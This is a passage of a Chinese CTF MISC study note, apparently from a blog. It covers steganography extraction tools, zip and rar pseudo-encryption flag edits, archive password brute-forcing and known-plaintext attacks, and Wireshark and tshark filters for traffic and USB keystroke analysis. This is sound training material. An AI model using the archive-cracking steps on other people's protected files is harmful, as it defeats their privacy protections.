class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(j)&#125;</span>&quot;</span>)                exit(<span class="hljs-number">0</span>)</code></pre></div><p>使用方法：</p><div class="code-wrapper"><pre><code class="hljs bash">python 文件名.py -f 图片</code></pre></div><h3 id="JPG-宽高"><a href="#JPG-宽高" class="headerlink" title="JPG 宽高"></a>JPG 宽高</h3><blockquote><p>使用随波逐流</p></blockquote><ol><li>将图片拖进去</li></ol><p><img src="/./CTF-MISC%E6%9D%82%E9%A1%B9/image-20251128215529315.png" alt="image-20251128215529315"></p><ol start="2"><li>在 【key】 栏中输入 想要修改图片的高度，可以输入任何数</li></ol><p><img src="/./CTF-MISC%E6%9D%82%E9%A1%B9/image-20251128215627441.png" alt="image-20251128215627441"></p><ol start="3"><li>点击 图片 – 修改 jpg 高度</li></ol><p><img src="/./CTF-MISC%E6%9D%82%E9%A1%B9/image-20251128215714901.png" alt="image-20251128215714901"></p><h3 id="Exif隐写"><a href="#Exif隐写" class="headerlink" title="Exif隐写"></a>Exif隐写</h3><p>Exiftools</p><p><img src="/CTF-MISC%E6%9D%82%E9%A1%B9/14.png"></p><h3 id="GIF-隐写"><a href="#GIF-隐写" class="headerlink" title="GIF 隐写"></a>GIF 隐写</h3><p>stegsole -&gt;  需要 java 环境</p><p><img src="/CTF-MISC%E6%9D%82%E9%A1%B9/31.png"></p><p>逐帧查看</p><h3 id="bftools-工具"><a href="#bftools-工具" class="headerlink" title="bftools 工具"></a>bftools 工具</h3><p>使用场景：在 windows 的 cmd 下，对加密过的图片文件进行解密</p><p><img src="/CTF-MISC%E6%9D%82%E9%A1%B9/15.png"></p><p>格式：</p><div class="code-wrapper"><pre><code class="hljs bash">bftools decode braincopter 要解密的图片名称 -out 输出文件名</code></pre></div><div class="code-wrapper"><pre><code class="hljs bash">bftools run 上一步输出的文件名称</code></pre></div><h3 id="silenteye-工具"><a href="#silenteye-工具" class="headerlink" title="silenteye 工具"></a>silenteye 工具</h3><p><img src="/CTF-MISC%E6%9D%82%E9%A1%B9/16.png"></p><p>对音频或者图片解密</p><h3 id="Stegdetect-工具探测加密方式"><a href="#Stegdetect-工具探测加密方式" class="headerlink" title="Stegdetect 工具探测加密方式"></a>Stegdetect 工具探测加密方式</h3><p>根据探测到的加密方式，选择对应的工具破解</p><p>常见加密 : steg, Jphide, outguess, invisible secretc, f5 appendx 和 camouflage</p><p><img src="/CTF-MISC%E6%9D%82%E9%A1%B9/18.png"></p><div class="code-wrapper"><pre><code class="hljs bash">stegdetect 文件名</code></pre></div><div class="code-wrapper"><pre><code class="hljs bash">stegdetect -s 敏感度 文件名</code></pre></div><h3 id="outguess-工具"><a href="#outguess-工具" class="headerlink" title="outguess 工具"></a>outguess 工具</h3><p>当 stegdetect 提示 outguess 加密时 </p><p>安装：（Kali Linux）</p><div class="code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> apt install outguess</code></pre></div><p><img src="/CTF-MISC%E6%9D%82%E9%A1%B9/17.png"></p><div class="code-wrapper"><pre><code class="hljs bash">outguess 要解密的文件名 输出结果文件名</code></pre></div><h3 id="JPhs-工具"><a href="#JPhs-工具" class="headerlink" title="JPhs 工具"></a>JPhs 工具</h3><p><img src="/CTF-MISC%E6%9D%82%E9%A1%B9/19.png"></p><h3 id="F5-工具"><a href="#F5-工具" class="headerlink" title="F5 工具"></a>F5 工具</h3><p>使用场景，当 stegdetect 识别出来是F5 加密的图片</p><p>使用方法 ： 进入F5 -steganography_F5 目录 ,将 图片 拷贝 到给目录下</p><div class="code-wrapper"><pre><code class="hljs bash">java extact 要解密的文件名 -p 密码</code></pre></div><h3 id="Steghide-工具"><a href="#Steghide-工具" class="headerlink" title="Steghide 工具"></a>Steghide 工具</h3><p>安装 （Kali Linux）</p><div class="code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> apt install steghide</code></pre></div><p><img src="/./CTF-MISC%E6%9D%82%E9%A1%B9/image-20251024234718310.png" alt="image-20251024234718310"></p><p>使用：</p><ul><li>将信息从隐藏的载体中分离出来</li></ul><div class="code-wrapper"><pre><code class="hljs bash">steghide extract -sf 文件名 -p 密码[可以为空]</code></pre></div><ul><li>将信息隐藏到载体中</li></ul><div class="code-wrapper"><pre><code class="hljs bash">steghide embed -cf test.jpg -ef secret.txt -p 123456</code></pre></div><h3 id="CQR-二维码处理"><a href="#CQR-二维码处理" class="headerlink" title="CQR 二维码处理"></a>CQR 二维码处理</h3><p><img src="/CTF-MISC%E6%9D%82%E9%A1%B9/20.png"></p><ul><li>二进制转二维码</li></ul><div class="code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> ImageMAX = <span class="hljs-number">25</span>pic = Image.new(<span class="hljs-string">&quot;RGB&quot;</span>,(MAX, MAX))<span class="hljs-built_in">str</span> = <span class="hljs-string">&quot;得到的二进制数字&quot;</span>i=<span class="hljs-number">0</span><span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span> (<span class="hljs-number">0</span>,MAX):    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span> (<span class="hljs-number">0</span>,MAX):        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">str</span>[i] == <span class="hljs-string">&#x27;1&#x27;</span>):            pic.putpixel([x,y],(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>))        <span class="hljs-keyword">else</span>:            pic.putpixel([x,y],(<span class="hljs-number">255</span>,<span class="hljs-number">255</span>,<span class="hljs-number">255</span>))        i = i+<span class="hljs-number">1</span>pic.show()pic.save(<span class="hljs-string">&quot;flag.png&quot;</span>)``</code></pre></div><h2 id="压缩文件处理"><a href="#压缩文件处理" class="headerlink" title="压缩文件处理"></a>压缩文件处理</h2><h3 id="伪加密"><a href="#伪加密" class="headerlink" title="伪加密"></a>伪加密</h3><p>如果压缩文件是加密的，或者文件头正常但是压缩错误，首先尝试问就按是否是伪加密。zip文件是否是加密，是通过标识符来显示的，在每个文件的文件目录字段有一位专门标识了文件是否加密，将其实设置为00表示该文件未加密，如果成功解压则文件为伪加密，如果解压出错说明文件为真加密，这时候就需要根据线索，或者使用工具来破解密码.</p><p><strong>如果是真加密也不用担心，密码一般都不会太复杂，而且一般都会给出密码位数（在爆破工具中要选择位数），它主要考察有没有暴力破解的工具和技术</strong></p><h4 id="zip-伪加密"><a href="#zip-伪加密" class="headerlink" title="zip 伪加密"></a>zip 伪加密</h4><p><img src="/CTF-MISC%E6%9D%82%E9%A1%B9/25.png"></p><p>用 WinHex 或者 010editor 打开 文件 将 标识的两处 09 00 改成 00 00  保存文件</p><p><img src="/CTF-MISC%E6%9D%82%E9%A1%B9/22.png"></p><p><img src="/CTF-MISC%E6%9D%82%E9%A1%B9/23.png"></p><p><strong>注：如果修改错误或者是真加密，文件名后面会有 星号 （  *  ）或者打开错误</strong></p><h4 id="rar-伪加密"><a href="#rar-伪加密" class="headerlink" title="rar 伪加密"></a>rar 伪加密</h4><p>rar 文件由于有头部校验， 使用 伪加密时 打开文件会出现报错，使用winhex 修改标志位后如果报错消失且正常解压缩，说明是伪加密。使用winhex 打开rar 文件，找到第24个字节，该字节尾数为4 表示加密，0表示无加密，将尾数改为0即可破解伪加密</p><p><img src="/CTF-MISC%E6%9D%82%E9%A1%B9/26.png"></p><h3 id="zip-密码破解"><a href="#zip-密码破解" class="headerlink" title="zip 密码破解"></a>zip 密码破解</h3><p>ziperello 工具</p><p><img src="/CTF-MISC%E6%9D%82%E9%A1%B9/27.png"></p><h3 id="rar-密码破解"><a href="#rar-密码破解" class="headerlink" title="rar 密码破解"></a>rar 密码破解</h3><p>ARCHPR 工具</p><p><img src="/CTF-MISC%E6%9D%82%E9%A1%B9/28.png"></p><p>如果知道密码的一部分可以选择使用掩码</p><h5 id="明文攻击"><a href="#明文攻击" class="headerlink" title="明文攻击"></a>明文攻击</h5><p>使用场景：已知加密的压缩文件中的铭文内容</p><p>例： 假设一个加密的压缩包中有两个文件 readme.txt 和 flag.txt，其中 flag.txt 的内容是我们希望知道的内容，而我们拥有readme.txt 的明文文件，使用上述两个文件可进行明文攻击</p><p>操作:</p><ol><li>将readme.txt 文件进行压缩，编程readme1.rar</li><li>打开 ARCHAR ，攻击类型选择明文，明文文件路径选择readme1.rar（j将明文文件不加密压缩后的文件），加密的文件</li><li>选择要破解的文件，点击开始，破解成功</li></ol><p><strong>注意： 使用该方法需要注意两个关键点</strong></p><ul><li>有一个明文文件，压缩后CRC值与加密压缩包中的文件一致</li><li>明文文件的压缩算法需要与加密压缩文件的压缩算法一致</li></ul><p><strong>有时候不一定能破解出文件口令，但是能够找到加密密钥等信息，可以直接将文件解密，点解确定保存解密后的文件即可</strong></p><p><img src="/CTF-MISC%E6%9D%82%E9%A1%B9/30.png"></p><h2 id="流量分析-wireshark"><a href="#流量分析-wireshark" class="headerlink" title="流量分析 wireshark"></a>流量分析 wireshark</h2><p>流量分析中常用协议</p><ul><li>TCP</li><li>UDP</li><li>HTTP</li><li>TLS</li><li>HTTPS</li><li>USB</li><li>DNS</li><li>WIFI</li><li>ICMP</li><li>ARP</li></ul><p><img src="/CTF-MISC%E6%9D%82%E9%A1%B9/3.png"></p><h3 id="流量包修复"><a href="#流量包修复" class="headerlink" title="流量包修复"></a>流量包修复</h3><h4 id="tshark"><a href="#tshark" class="headerlink" title="tshark"></a>tshark</h4><p>wireshark 的命令行版</p><p><img src="/CTF-MISC%E6%9D%82%E9%A1%B9/4.png"></p><h3 id="协议分析"><a href="#协议分析" class="headerlink" title="协议分析"></a>协议分析</h3><h3 id="数据提取"><a href="#数据提取" class="headerlink" title="数据提取"></a>数据提取</h3><h4 id="方法1："><a href="#方法1：" class="headerlink" title="方法1："></a>方法1：</h4><h5 id="过滤ip"><a href="#过滤ip" class="headerlink" title="过滤ip"></a>过滤ip</h5><div class="code-wrapper"><pre><code class="hljs llvm">ip.src <span class="hljs-keyword">eq</span> <span class="hljs-keyword">x</span>.<span class="hljs-keyword">x</span>.<span class="hljs-keyword">x</span>.<span class="hljs-keyword">x</span> <span class="hljs-keyword">or</span> ip.dst <span class="hljs-keyword">eq</span> <span class="hljs-keyword">x</span>.<span class="hljs-keyword">x</span>.<span class="hljs-keyword">x</span>.<span class="hljs-keyword">x</span> 或 ip.addr <span class="hljs-keyword">eq</span> <span class="hljs-keyword">x</span>.<span class="hljs-keyword">x</span>.<span class="hljs-keyword">x</span>.<span class="hljs-keyword">x</span></code></pre></div><h5 id="过滤端口"><a href="#过滤端口" class="headerlink" title="过滤端口"></a>过滤端口</h5><div class="code-wrapper"><pre><code class="hljs elm"><span class="hljs-title">tcp</span>.<span class="hljs-keyword">port</span> eq 80 or udp.<span class="hljs-keyword">port</span> eq 80<span class="hljs-title">tcp</span>.dst<span class="hljs-keyword">port</span> == 80 只显示tcp协议的目标端口为80 <span class="hljs-title">tcp</span>.src<span class="hljs-keyword">port</span> == 80 只显示tcp协议的源端口为80<span class="hljs-title">tcp</span>.<span class="hljs-keyword">port</span> &gt;= 1 and tcp.<span class="hljs-keyword">port</span> &lt;= 80</code></pre></div><h5 id="过滤协议"><a href="#过滤协议" class="headerlink" title="过滤协议"></a>过滤协议</h5><div class="code-wrapper"><pre><code class="hljs awk">tcp<span class="hljs-regexp">/udp/</span>arp<span class="hljs-regexp">/icmp/</span>http<span class="hljs-regexp">/ftp/</span>dns/ip</code></pre></div><h5 id="过滤mac"><a href="#过滤mac" class="headerlink" title="过滤mac"></a>过滤mac</h5><div class="code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">eth</span>.dst == A0:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">04</span>:C:<span class="hljs-number">84</span>   过滤目标mac地址</code></pre></div><h5 id="包长度过滤"><a href="#包长度过滤" class="headerlink" title="包长度过滤"></a>包长度过滤</h5><div class="code-wrapper"><pre><code class="hljs abnf">udp.length <span class="hljs-operator">=</span><span class="hljs-operator">=</span> <span class="hljs-number">26</span></code></pre></div><h5 id="USB流量分析"><a href="#USB流量分析" class="headerlink" title="USB流量分析"></a>USB流量分析</h5><div class="code-wrapper"><pre><code class="hljs css">tshark -<span class="hljs-attribute">r</span> usb1<span class="hljs-selector-class">.pcap</span> -T fields -e usb<span class="hljs-selector-class">.capdata</span> &gt; usbdata<span class="hljs-selector-class">.txt</span></code></pre></div><h4 id="方法2："><a href="#方法2：" class="headerlink" title="方法2："></a>方法2：</h4><ul><li>使用 Github 上一个大佬写的工具\<ul><li><a href="https://github.com/Mumuzi7179/UsbKeyboard_Mouse_Hacker_Gui">https://github.com/Mumuzi7179/UsbKeyboard_Mouse_Hacker_Gui</a></li><li><img src="/CTF-MISC%E6%9D%82%E9%A1%B9/Mouse_Key2.png"></li></ul></li></ul><ul><li>选择要提取的数据，选择键盘或者鼠标流量，将cap文件拖入程序中即可</li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>MISC</tag>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
